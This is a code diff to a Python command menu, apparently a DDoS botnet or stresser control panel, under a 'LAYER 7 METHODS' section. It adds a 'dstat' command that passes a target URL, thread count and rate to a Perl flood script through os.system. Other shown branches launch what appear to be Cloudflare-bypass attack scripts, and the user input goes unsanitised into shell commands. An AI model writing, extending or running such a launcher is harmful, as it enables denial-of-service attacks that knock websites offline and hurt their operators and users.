@@ -300,11 +300,22 @@ def main():
 
 # LAYER 7 METHODS
         
+        elif "dstat" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                per = cnc.split()[3]
+                os.system(f'perl dstat.pl {url} {thread} {per} 127.0.0.1')
+            except IndexError:
+                print('Usage: dstat <url> <threads> <per>')
+                print('Example: dstat http://example.com 200 200')
+                
         elif "cf-pro" in cnc:
             try:
                 os.system(f'python3 cf-pro.py')
             except IndexError:
                 print('cf-pro')
+                
         elif "cf-socket" in cnc:
             try:
                 os.system(f'python3 bypass.py')
